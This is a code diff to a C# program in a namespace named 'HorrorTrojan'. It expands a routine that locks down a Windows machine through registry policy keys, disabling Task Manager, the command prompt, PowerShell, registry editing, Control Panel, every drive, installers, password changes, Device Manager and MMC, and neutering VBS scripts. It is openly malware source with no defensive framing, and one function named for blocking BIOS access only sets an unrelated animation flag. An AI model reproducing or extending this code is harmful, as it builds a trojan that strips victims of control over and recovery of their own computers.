@@ -6,6 +6,7 @@ namespace HorrorTrojan
     {
         public static void BlockEverything()
         {
+            // ===== ОСНОВНЫЕ БЛОКИРОВКИ =====
             DisableTaskManager();
             DisableCMD();
             DisablePowerShell();
@@ -15,11 +16,23 @@ namespace HorrorTrojan
             DisableSafeMode();
             DisableAlternateBoot();
             RemoveSystemRestore();
+            
+            // ===== ДОПОЛНИТЕЛЬНЫЕ БЛОКИРОВКИ =====
+            DisableControlPanel();
+            DisableDrives();
+            DisableInstallers();
+            DisablePasswordChange();
+            DisableDeviceManager();
+            DisableMMC();
+            DisableBIOSAccess();
         }
         
         private static void DisableTaskManager()
         {
             using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
+                key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
+                
+            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                 key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
         }
         
@@ -27,11 +40,17 @@ namespace HorrorTrojan
         {
             using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\System"))
                 key.SetValue("DisableCMD", 2, RegistryValueKind.DWord);
+                
+            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"Software\Policies\Microsoft\Windows\System"))
+                key.SetValue("DisableCMD", 2, RegistryValueKind.DWord);
         }
         
         private static void DisablePowerShell()
         {
             using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\Windows\PowerShell"))
+                key.SetValue("EnableScripts", 0, RegistryValueKind.DWord);
+                
+            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"Software\Policies\Microsoft\Windows\PowerShell"))
                 key.SetValue("EnableScripts", 0, RegistryValueKind.DWord);
         }
         
@@ -39,11 +58,17 @@ namespace HorrorTrojan
         {
             using (RegistryKey key = Registry.ClassesRoot.CreateSubKey(@".vbs"))
                 key.SetValue("", "txtfile", RegistryValueKind.String);
+                
+            using (RegistryKey key = Registry.ClassesRoot.CreateSubKey(@".vbe"))
+                key.SetValue("", "txtfile", RegistryValueKind.String);
         }
         
         private static void DisableRegistryTools()
         {
             using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
+                key.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
+                
+            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
                 key.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
         }
         
@@ -79,6 +104,51 @@ namespace HorrorTrojan
                 }
             }
             catch { }
+        }
+        
+        private static void DisableControlPanel()
+        {
+            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
+                key.SetValue("NoControlPanel", 1, RegistryValueKind.DWord);
+        }
+        
+        private static void DisableDrives()
+        {
+            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"))
+            {
+                key.SetValue("NoDrives", 0x03FFFFFF, RegistryValueKind.DWord);
+                key.SetValue("NoViewOnDrive", 0x03FFFFFF, RegistryValueKind.DWord);
+            }
+        }
+        
+        private static void DisableInstallers()
+        {
+            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\Installer"))
+                key.SetValue("DisableMSI", 2, RegistryValueKind.DWord);
+        }
+        
+        private static void DisablePasswordChange()
+        {
+            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
+                key.SetValue("DisableChangePassword", 1, RegistryValueKind.DWord);
+        }
+        
+        private static void DisableDeviceManager()
+        {
+            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
+                key.SetValue("NoDevMgr", 1, RegistryValueKind.DWord);
+        }
+        
+        private static void DisableMMC()
+        {
+            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Policies\Microsoft\MMC"))
+                key.SetValue("RestrictToPermittedSnapins", 1, RegistryValueKind.DWord);
+        }
+        
+        private static void DisableBIOSAccess()
+        {
+            using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Policies\Microsoft\Windows\System"))
+                key.SetValue("EnableFirstLogonAnimation", 0, RegistryValueKind.DWord);
         }
     }
 }
